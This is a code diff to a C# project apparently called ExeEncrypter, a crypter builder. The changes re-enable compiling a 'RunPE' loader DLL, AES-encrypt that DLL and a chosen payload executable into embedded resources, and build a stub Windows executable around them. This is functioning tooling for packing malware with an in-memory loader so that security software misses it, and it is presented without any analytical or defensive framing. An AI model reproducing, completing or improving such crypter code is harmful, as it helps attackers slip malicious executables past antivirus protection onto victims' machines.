@@ -108,14 +108,15 @@ namespace ExeEncrypter
                     {"CompilerVersion", "v4.0" }
                 };
 
-            /*
+            MessageBox.Show("RunPE Build Started");
+
             var compilerOptions = "/target:library /platform:x86 /optimize+";
             using (CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider(providerOptions))
             {
                 CompilerParameters compilerParameters = new CompilerParameters(referencedAssemblies)
                 {
                     GenerateExecutable = false,
-                    OutputAssembly = Path.Combine(BuildPath, "RunPE" + ".dll"),
+                    OutputAssembly = Path.Combine(BuildPath, "RunPE.dll"),
                     CompilerOptions = compilerOptions,
                     TreatWarningsAsErrors = false,
                     IncludeDebugInformation = false,
@@ -131,12 +132,15 @@ namespace ExeEncrypter
                         MessageBox.Show(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
                             compilerError.Line, compilerError.Column, compilerError.FileName));
                     }
+                    return;
+                } else
+                {
+                    MessageBox.Show("RunPE Build success");
                 }
             }
-            */
-            MessageBox.Show("Build Started");
-
-            var compilerOptions = "/target:winexe /platform:x86 /optimize+";
+            
+            compilerOptions = "/target:winexe /platform:x86 /optimize+";
+            MessageBox.Show("Program Build start");
 
             using (CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider(providerOptions))
             {
@@ -152,6 +156,7 @@ namespace ExeEncrypter
 
                 using (ResourceWriter rw = new ResourceWriter(Path.Combine(BuildPath, Path.GetFileNameWithoutExtension(payloadPath) + ".resources")))
                 {
+                    rw.AddResource("RunPE", AES_Encrypt(File.ReadAllBytes(Path.Combine(BuildPath, "RunPE.dll")),KeyTextbox.Text));
                     rw.AddResource("payload", AES_Encrypt(File.ReadAllBytes(FilePathTextbox.Text), KeyTextbox.Text));
                     rw.Generate();
                 }
@@ -167,10 +172,12 @@ namespace ExeEncrypter
                         MessageBox.Show(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
                             compilerError.Line, compilerError.Column, compilerError.FileName));
                     }
+                    MessageBox.Show("Program Build Error");
+                    return;
                 }
                 else
                 {
-                    MessageBox.Show("Build Success", "Error", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    MessageBox.Show("Program Build Success");
                 }
 
             }
